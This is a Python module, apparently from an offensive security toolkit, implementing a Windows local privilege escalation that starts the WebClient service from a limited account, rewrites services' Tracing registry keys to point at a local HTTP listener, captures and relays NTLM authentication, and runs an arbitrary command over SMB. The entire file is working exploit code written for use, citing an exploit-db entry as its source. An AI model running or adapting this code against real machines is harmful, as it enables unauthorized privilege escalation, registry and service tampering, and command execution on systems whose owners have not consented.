# -*- coding: utf-8 -*-
import time

from random import randint

try:
    import _winreg as winreg
except ImportError:
    import winreg

from .attack import DoAttack
from .constant import constants
from .httpserver import runHTTPServer
from ....modules.objects.winstructures import *

from ctypes import *
from ctypes.wintypes import *

UCHAR = c_ubyte

# x86 bits system
if sizeof(c_voidp) == 4:
    ULONGLONG = c_longlong
# x64 bits system
else:
    ULONGLONG = c_ulonglong


class GUID(Structure):
    _fields_ = [
        ("Data1", DWORD),
        ("Data2", WORD),
        ("Data3", WORD),
        ("Data4", BYTE * 8)
    ]


class EVENT_DESCRIPTOR(Structure):
    _fields_ = [
        ("Id", USHORT),
        ("Version", UCHAR),
        ("Channel", UCHAR),
        ("Level", UCHAR),
        ("Opcode", UCHAR),
        ("Task", USHORT),
        ("Keyword", ULONGLONG)
    ]


class WebClient(object):
    """
    Inspired from https://github.com/secruul/SysExec
    And https://www.exploit-db.com/exploits/36424/
    """
    def __init__(self):
        self.scm = OpenSCManager(None, None, SC_MANAGER_CONNECT)

        # Define functions
        self.EventRegister = windll.advapi32.EventRegister
        self.EventUnregister = windll.advapi32.EventUnregister
        self.EventWrite = windll.advapi32.EventWrite

        self.timeout = 20

    def is_smb_hardened(self):
        """
        Check if the system has been hardened enough to avoid this kind of privilege escalation
        """
        hkey = OpenKey(HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters', 0, KEY_READ)

        smb_signature = 0
        server_name_hardening = 0
        try:
            smb_signature = int(winreg.QueryValueEx(hkey, 'RequireSecuritySignature')[0])
            server_name_hardening = int(winreg.QueryValueEx(hkey, 'SmbServerNameHardeningLevel')[0])
        except Exception:
            pass

        if smb_signature == 0 and server_name_hardening == 0:
            return False
        else:
            return True

    # start the WebClient service from a limited user
    def start_webclient(self):
        success = False
        hReg = HANDLE()
        guid = GUID()

        # guid: 0x87, 0xC9, 0xEF, 0xFC, 0xBE, 0x66, 0x43, 0xC7
        guid.Data1 = c_ulong(0x22B6D684)
        guid.Data2 = c_ushort(0xFA63)
        guid.Data3 = c_ushort(0x4578)

        guid.Data4[0] = c_byte(0x87)
        guid.Data4[1] = c_byte(0xC9)
        guid.Data4[2] = c_byte(0xEF)
        guid.Data4[3] = c_byte(0xFC)
        guid.Data4[4] = c_byte(0xBE)
        guid.Data4[5] = c_byte(0x66)
        guid.Data4[6] = c_byte(0x43)
        guid.Data4[7] = c_byte(0xC7)

        if self.EventRegister(byref(guid), None, None, byref(hReg)) == 0:
            event_desc = EVENT_DESCRIPTOR()
            event_desc.Id = 1
            event_desc.Version = 0
            event_desc.Channel = 0
            event_desc.Level = 4
            event_desc.Task = 0
            event_desc.Opcode = 0
            event_desc.Keyword = 0

            if self.EventWrite(hReg, byref(event_desc), 0, None) == 0:
                success = True
            self.EventUnregister(hReg)

        return success

    def find_services_trigger(self, service):
        access_write = KEY_WRITE | KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE
        hkey = OpenKey(HKEY_LOCAL_MACHINE, 'SOFTWARE\\Microsoft\\Tracing', 0, access_write)
        num = winreg.QueryInfoKey(hkey)[0]

        triggers = []
        for x in range(0, num):
            svc = winreg.EnumKey(hkey, x)
            for s in service:
                if s.name.lower() == svc.lower() and s.permissions['start']:
                    is_service_running = self.is_service_running(svc)
                    if not is_service_running or (is_service_running and s.permissions['stop']):
                        triggers.append(s)
                        print('[+] Service {name} found'.format(name=s.name))
                    else:
                        print('[-] Service {name} already running and could not be stopped'.format(name=s.name))
        winreg.CloseKey(hkey)
        return triggers

    def modify_registry(self, service_name, file_directory='%windir%\\tracing', enableFileTracing=0):
        skey = OpenKey(HKEY_LOCAL_MACHINE, 'SOFTWARE\\Microsoft\\Tracing\\%s' % service_name, 0, KEY_WRITE)
        winreg.SetValueEx(skey, 'FileDirectory', 0, REG_EXPAND_SZ, file_directory)
        winreg.SetValueEx(skey, 'EnableFileTracing', 0, REG_DWORD, enableFileTracing)
        winreg.CloseKey(skey)

    # check if a service is stopped or if it is running
    def is_service_running(self, service_name):
        is_running = False
        sc_query_config = OpenService(self.scm, service_name, SERVICE_QUERY_STATUS)
        ss = SERVICE_STATUS()
        if QueryServiceStatus(sc_query_config, byref(ss)):
            status = int(ss.dwCurrentState.real)
        else:
            status = False

        if status == SERVICE_RUNNING:
            is_running = True

        # wait that the service start correctly
        if status == SERVICE_START_PENDING:
            time.sleep(2)
            is_running = True

        CloseServiceHandle(sc_query_config)
        return is_running

    # Open a service given either it's long or short name.
    def smart_open_service(self, hscm, name, access):
        try:
            return OpenService(hscm, name, access)
        except Exception:
            return False

        lpcchBuffer = LPDWORD()
        lpDisplayName = PCTSTR()
        lpServiceName = PCTSTR()
        result = GetServiceKeyName(hscm, byref(lpDisplayName), byref(lpServiceName), lpcchBuffer)
        if result:
            name = lpServiceName.value
            return OpenService(hscm, name, access)
        else:
            return False

    def StartService(self, service_name, args=0, machine=None):
        hscm = OpenSCManager(machine, None, SC_MANAGER_CONNECT)
        try:
            hs = self.smart_open_service(hscm, service_name, SERVICE_START)
            if hs:
                try:
                    StartService(hs, args, None)
                finally:
                    CloseServiceHandle(hs)
        finally:
            CloseServiceHandle(hscm)

    def StopService(self, service_name, machine=None):
        hscm = OpenSCManager(machine, None, SC_MANAGER_CONNECT)
        try:
            hs = self.smart_open_service(hscm, service_name, SERVICE_STOP)
            if hs:
                try:
                    ss = SERVICE_STATUS()
                    ControlService(hs, SERVICE_CONTROL_STOP, byref(ss))
                finally:
                    CloseServiceHandle(hs)
        finally:
            CloseServiceHandle(hscm)

    def run(self, service, command):
        print('[!] Checking WebClient vulnerability')

        if self.is_smb_hardened():
            print('[-] Not vulnerable, SMB is hardened')
            return False

        # check if webclient is already running
        if not self.is_service_running('WebClient'):
            # if not try to start it
            if self.start_webclient():

                # check if service has been correctly started
                if not self.is_service_running('WebClient'):
                    print('[-] WebClient could not be started')
                    return False

        print('[!] Find services used to trigger an NTLM hash')
        triggers = self.find_services_trigger(service)
        if not triggers:
            print('[-] No service found')
            return False

        else:
            for trigger in triggers:
                error = False
                port = randint(8000, 9999)

                # launch http server
                print('[!] Setting up HTTP Server 127.0.0.1:{port}'.format(port=port))
                print('[!] Command to execute: {command}'.format(command=command))
                runHTTPServer(port, service=trigger.name, command=command)

                # check if the trigger service is already running
                if self.is_service_running(trigger.name) and trigger.permissions['stop']:
                    # we may not have privilege to stop it but lets try to check a misconfiguration on this service
                    print('[!] Service {name} is running, trying to stop it'.format(name=trigger.name))
                    self.StopService(trigger.name)

                    if self.is_service_running(trigger.name):
                        # service could not be used as trigger
                        print('[-] Unable to stop the sevice {name}'.format(name=trigger.name))
                        continue
                    print('[+] Service {name} has been stopped'.format(name=trigger.name))

                # redirect FileDirectory regedit key to our listening server
                self.modify_registry(trigger.name, file_directory='\\\\127.0.0.1@%s\\tracing' % port,
                                     enableFileTracing=1)

                # launch service trigger
                self.StartService(trigger.name)
                if self.is_service_running(trigger.name):
                    print('[+] Service {name} has been correctly started, waiting to get an hash'.format(
                        name=trigger.name))
                else:
                    print('[-] Failed to start the service {name}'.format(name=trigger.name))
                    continue

                start = time.time()
                while not constants.output_cmd:
                    elapsed = time.time() - start
                    if elapsed > self.timeout and not constants.is_running:
                        print('[-] Timeout reached. Exit')
                        error = True
                        break

                # clean up / restore value as origin
                self.modify_registry(trigger.name)

                # success
                if not error:
                    break

        ok = False
        if constants.authentication_succeed:
            try:
                print('[!] Stopping the service {name}'.format(name=trigger.name))
                execute_cmd = DoAttack(constants.smb_client, 'sc stop {name}'.format(name=trigger.name))
                execute_cmd.run()
                if not self.is_service_running(trigger.name):
                    print('[+] Service {name} has been correctly stopped'.format(name=trigger.name))
            except Exception:
                pass

            print('[+] Authentication succeed: \n\n{output}'.format(output=str(constants.output_cmd)))
            ok = True

        elif constants.authentication_succeed == False:
            print('[-] Authentication failed; seems not vulnerable')

        elif constants.authentication_succeed == None:
            print('[?] The authentication process has not reached the end, try to check the standard output')

        return ok
